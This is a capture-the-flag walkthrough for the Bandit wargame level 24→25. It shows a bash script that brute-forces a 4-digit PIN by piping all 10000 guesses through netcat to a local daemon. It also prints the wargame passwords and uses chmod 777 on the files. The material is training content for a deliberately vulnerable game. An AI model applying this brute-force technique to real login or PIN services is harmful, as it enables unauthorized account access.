# ❓Question

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

#📋 Walkthrough

Lets try connect to port 30002 and see what happen

```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0000
Wrong! Please enter the correct current password and pincode. Try again.
```

So when we connect they will ask for password and 4 digit number. We can brute forcing it with script

```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.se4SDau7gj
bandit24@bandit:~$ cd /tmp/tmp.se4SDau7gj
bandit24@bandit:/tmp/tmp.se4SDau7gj$ nano script.sh
```

```bash
#!/bin/bash

for i in {0000..9999}
do 
        echo hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i >> list.txt
done

cat list.txt | nc localhost 30002 > results.txt
```
We echo the password with the 4 digit number and put it inside list.txt

Then open the list.txt and pipe it into nc localhost 30002 and the output went inside results.txt

```bash
bandit24@bandit:/tmp/tmp.se4SDau7gj$ touch list.txt
bandit24@bandit:/tmp/tmp.se4SDau7gj$ touch results.txt
bandit24@bandit:/tmp/tmp.se4SDau7gj$ chmod 777 list.txt results.txt /tmp/tmp.se4SDau7gj
bandit24@bandit:/tmp/tmp.se4SDau7gj$ chmod 777 script.sh
```

Touch the file first then change its permission and run the script

```bash
bandit24@bandit:/tmp/tmp.se4SDau7gj$ ./script.sh
```

If you open the results.txt you gonna get bombard with lot of wrong. We can use grep to get what we want.

Use the option -v to show everything that does not match this pattern

```bash
bandit24@bandit:/tmp/tmp.se4SDau7gj$ cat results.txt | grep -v "Wrong!"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```